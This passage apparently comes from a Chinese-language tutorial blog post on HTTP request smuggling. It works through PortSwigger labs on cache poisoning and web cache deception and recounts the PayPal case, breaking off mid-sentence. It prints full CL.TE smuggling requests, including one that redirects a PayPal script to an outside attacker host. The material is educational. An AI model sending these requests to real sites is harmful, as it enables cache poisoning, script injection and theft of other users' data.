wwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129014911.png" alt=""></p><p>发送以下数据包一次：</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac7a1f141fadd93d801c469f005500bf.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=f6c7ZBB52a6iedorGSywc8jM6USu4685</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 178</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac701fe61fabd97b8027465701f800a8.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后访问<code>/resources/js/tracking.js</code>:</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129015245.png" alt=""></p><p>我们可以看到响应包的跳转地址被我们修改成了我们 exploit 的服务器地址，然后我们访问正常服务器主页试试：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129015530.png" alt=""></p><p>可以看到成功<code>alert(1)</code>。</p><p>整个流程我们可以利用以下流程来理解：</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Innocent        Attacker          Front           Backend</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string"> * ending B *</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">            [*CP*]&lt;--B(200)----</span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">&lt;--B(200)------</span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">--C---------------------------&gt;</span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">&lt;--B(200)--------------------[HIT]             </span>|</span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>1A + 1/2B means request A + an incomplete query B</li><li>A(X) : means X query is hidden in body of query A</li><li>CP : Cache poisoning</li></ul><p>与之前那个流程图类似，因为在 C 请求的<code>/resources/js/tracking.js</code>会被 Front 认为是静态资源缓存起来，而我们利用 HTTP Smuggling 将这个请求导向了我们的 exploit 服务器，返回了<code>alert(1)</code>给 C 请求，然后这个响应包就会被 Front 服务器缓存起来，这样我们就成功进行了投毒。</p><h3 id="Perform-Web-Cache-Deception"><a href="#Perform-Web-Cache-Deception" class="headerlink" title="Perform Web Cache Deception"></a>Perform Web Cache Deception</h3><p>其实这个场景与缓存投毒类似，但是稍有一点区别，按照比较官方的说法，缓存欺骗与缓存投毒有以下这些区别：</p><blockquote><p>​    What is the difference between web cache poisoning and web cache deception?</p><ul><li>In <strong>web cache poisoning</strong>, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.</li><li>In <strong>web cache deception</strong>, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.</li></ul></blockquote><p>在 Web 缓存投毒中，攻击者使应用程序将某些恶意内容存储在缓存中，并将该内容从缓存中提供给其他应用程序用户。<br>在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索该内容。</p><p>这个我们就不配合 <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to perform web cache deception</a> 来做了，因为 LAB 提供的环境 victim 有点问题。</p><p>我们可以这么理解，我们发送如下 HTTP 请求：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 43</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /private/messages HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Foo</span>: X</span><br></pre></td></tr></tbody></table></figure><p></p><p>该 Smugle 的请求会用<code>Foo: X</code>吃掉下一个发过来的请求头的第一行，也就是<code>GET /xxx HTTP/1.1</code>那一行，并且这个请求还会带着用户的 Cookie 去访问，类似于一个CSRF，该请求变成了以下请求头：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/private/messages</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Foo</span>: XGET /static/some-image.png HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br></pre></td></tr></tbody></table></figure><p></p><p>只要我们多发送几次，一旦用户访问的是静态资源，就可能会被 Front 服务器缓存起来，我们就可以拿到用户<code>/private/messages</code>的信息了。这里可能需要大量的重复发包，因为需要构造让静态资源缓存，还是需要一定运气的。</p><p>至此，HTTP Smuggling 的基本攻击面都已经介绍完毕了。</p><h1 id="Real-World"><a href="#Real-World" class="headerlink" title="Real World"></a>Real World</h1><h2 id="Paypal"><a href="#Paypal" class="headerlink" title="Paypal"></a>Paypal</h2><p>首先肯定得来聊聊今年分享 HTTP Smuggling 的作者在 Black Hat 上分享的 Paypal 漏洞实例了</p><p>作者首先通过 HTTP Smuggling 的方式将一个用于 Paypal 登录的 js 文件进行了投毒：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 </span><br><span class="line"><span class="hljs-attribute">Host</span>: c.paypal.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 61 </span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /webstatic HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: skeletonscribe.net?</span><br><span class="line"><span class="hljs-attribute">X</span>: XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 </span><br><span class="line"><span class="hljs-attribute">Host</span>: c.paypal.com</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="hljs-number">302</span> Found</span><br><span class="line"><span class="hljs-attribute">Location</span>: http://skeletonscribe.net?, c.paypal.com/webstatic/</span><br></pre></td></tr></tbody></table></figure><p></p><p>但是 Paypal 登录页面有 CSP 规则 <code>script-src</code> 限制了这个跳转。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg" alt=""></p><p>后来作者发现该页面还有一个动态生成的 iframe 引入了 c.paypal.com ，且该子页面没有 CSP 而且还引入了作者投毒的 js 文件！虽然这样可以控制 iframe 页面，但是由于同源策略，是读不到父页面的数据的。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg" alt=""></p><p>再接着作者的同事在 paypal.com/us/gifts 发现了一个不使用 CSP 的页面，并且也导入了作者投毒的 js 文件，这样作者终于通过 js 将 c.paypal.com 的 iframe 重定向到了 